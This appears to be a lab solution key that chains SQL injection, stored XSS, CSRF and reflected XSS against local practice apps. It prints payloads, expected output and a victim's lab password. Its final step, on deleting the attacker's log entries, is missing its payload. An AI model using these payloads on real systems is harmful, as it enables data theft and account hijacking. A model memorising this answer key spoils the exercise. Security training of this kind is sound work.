# Solution B1

## 1. Confirm SQL injection and column count

Use Gym Check-In with Member ID `7700001`. Put this in the access-code field:

```sql
x' OR '1'='1' -- -
```

Then find the number of returned columns:

```sql
x' ORDER BY 1 -- -
x' ORDER BY 2 -- -
x' ORDER BY 3 -- -
x' ORDER BY 4 -- -
x' ORDER BY 5 -- -
x' ORDER BY 6 -- -
```

`ORDER BY 5` should still work and `ORDER BY 6` should fail. The original query has five columns.

## 2. Discover tables and columns

Useful table discovery payload:

```sql
x' UNION SELECT 1,'','',GROUP_CONCAT(table_name),0 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
```

Expected relevant output:

```text
log,membership
```

Column discovery:

```sql
x' UNION SELECT 1,'','',GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ', '),0 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='membership' -- -
```

```sql
x' UNION SELECT 1,'','',GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ', '),0 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='log' -- -
```

Expected column sets:

```text
membership: id, first_name, last_name, access_code, credits_remaining
log: id, submitted_id, submitted_secret, attempted_at
```

## 3. Extract the roster

Use this payload in the access-code field:

```sql
x' UNION SELECT 1,'','',GROUP_CONCAT(CONCAT(id,' ',first_name,' ',last_name,':',credits_remaining) ORDER BY id SEPARATOR '<br>'),0 FROM membership -- -
```

This should display all fifteen Gym members and their remaining credits.

## 4. Prepare the reflected-XSS URL

The Forum feed safely escapes message HTML, but it converts plain URLs into clickable links. The Forum search page uses a parameterized database lookup, but when there are no matching messages it reflects the query text into the HTML page without escaping.

The URL that should appear in the victim's Forum post is:

```text
http://localhost:5001/search?q=%3Cscript%3Edocument.title%3D%22B1-REFLECTED-XSS%22%3C%2Fscript%3E
```

When the link is opened, the browser decodes the `q` parameter into:

```html
<script>document.title="B1-REFLECTED-XSS"</script>
```

That script should execute only on the search page. Viewing the normal Forum feed should not execute it because the feed escapes message bodies before linkifying URLs.

For the CSRF form body, the URL's percent signs must themselves be percent-encoded because the value is being sent through `application/x-www-form-urlencoded`:

```text
message=Check+this+out%3A+http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253C%252Fscript%253E
```

## 5. Persist the targeted browser payload

Log in to the Campus Forum as the victim `rafi.islam` using password `forum-Rafi-17`. Keep that session active.

Then submit this Gym Check-In request:

- Member ID: `7700001`
- Access-code field:

```sql
fit-nabila-17'; UPDATE membership SET last_name='<script>fetch("http://localhost:5001/reply",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},credentials:"include",body:"message=Check+this+out%3A+http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253C%252Fscript%253E"});</script>' WHERE id=7700002; -- -
```

The `WHERE id=7700002` condition is essential. The attacker submits the injection as `7700001`, but the stored XSS must be planted in the victim's membership row.

## 6. Trigger the victim-session CSRF

While the victim Forum session is still active, perform a normal Gym Check-In for the victim:

- Member ID: `7700002`
- Access code: `fit-rafi-17`

The Gym page renders the victim's name without escaping it, so the stored script runs in the browser. It sends a POST request to `http://localhost:5001/reply` with the victim's Forum cookie. Open the Forum feed and confirm a new message is attributed to Rafi.

Expected visible Forum message body:

```text
Check this out: http://localhost:5001/search?q=%3Cscript%3Edocument.title%3D%22B1-REFLECTED-XSS%22%3C%2Fscript%3E
```

## 7. Trigger the reflected-XSS marker

Click the posted URL or paste it into the browser:

```text
http://localhost:5001/search?q=%3Cscript%3Edocument.title%3D%22B1-REFLECTED-XSS%22%3C%2Fscript%3E
```

Expected result:

- The search page title becomes `B1-REFLECTED-XSS`.
- The ordinary Forum feed remains inert.
- A normal unrelated search does not preserve this marker.

Use the Gym Check-In access-code field:


This removes only the attacker's Gym submission log entries. It should not remove the victim's normal trigger submission or the seeded records for other members.
